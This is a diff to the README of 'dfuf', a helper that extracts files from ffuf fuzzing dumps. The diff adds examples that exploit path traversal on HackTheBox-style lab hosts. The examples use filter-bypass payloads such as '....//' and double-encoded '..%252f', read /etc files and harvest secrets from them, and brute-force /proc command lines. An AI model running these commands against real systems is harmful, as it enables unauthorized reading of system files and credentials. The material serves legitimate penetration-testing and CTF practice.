@@ -20,7 +20,18 @@ This simple script can extract files from the request & response dump saved by *
 
 ## Demo
 
-[![asciicast](https://asciinema.org/a/FBwbf8oRoy869FkCgR8JjaGeM.svg)](https://asciinema.org/a/FBwbf8oRoy869FkCgR8JjaGeM)
+- Brute force cmdline in `/proc`
+
+[![asciicast](https://asciinema.org/a/627480.svg)](https://asciinema.org/a/627480)
+
+- Dump common files under `/etc` and harvest secrets
+
+[![asciicast](https://asciinema.org/a/627891.svg)](https://asciinema.org/a/627891)
+
+- Dump files in webroot with url double encode
+
+[![asciicast](https://asciinema.org/a/627946.svg)](https://asciinema.org/a/627946)
+
 
 ## Installation
 
@@ -63,8 +74,9 @@ Examples:
         $ dfuf -o ffuf.json -od ffuf ffuf_dump
 
     2. Common files under `/etc` (8314 lines) (~1 min)
-        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w '/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt' -fs 0 -od ffuf -o ffuf.json
+        $ ffuf -c -u 'http://snoopy.htb/download?file=....//....//....//..../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 0 -od ffuf -o ffuf.json
         $ dfuf -o ffuf.json -od ffuf ffuf_dump
+        $ tartufo scan-folder ffuf_dump/
 
     3. Brute force cmdline in `/proc` (~1 min)
         $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -fs 0 -od ffuf -o ffuf.json
@@ -72,6 +84,11 @@ Examples:
 
         View the result in a pretty format :
         $ find ffuf_dump/proc -type f -exec bash -c 'pid=$(echo $0 | cut -d '/' -f3); echo -en "\n$pid | "; cat $0 | tr "\0" " "' {} \; | sort -s -n -k 1,1
+
+    4. Files in web root with url double encode
+        $ feroxbuster -t 150 -o ferox_443.txt -k -u https://broscience.htb/
+        $ ffuf -c -u 'https://broscience.htb/includes/img.php?path=..%252fFUZZ' -w <(cat ferox_443.txt | awk '{print $6}' | unfurl -u paths | grep '.php$') -enc 'FUZZ:urlencode' -o ffuf.json -od ffuf
+        $ dfuf -o ffuf.json -od ffuf ffuf_dump
 ```
 
 ## License
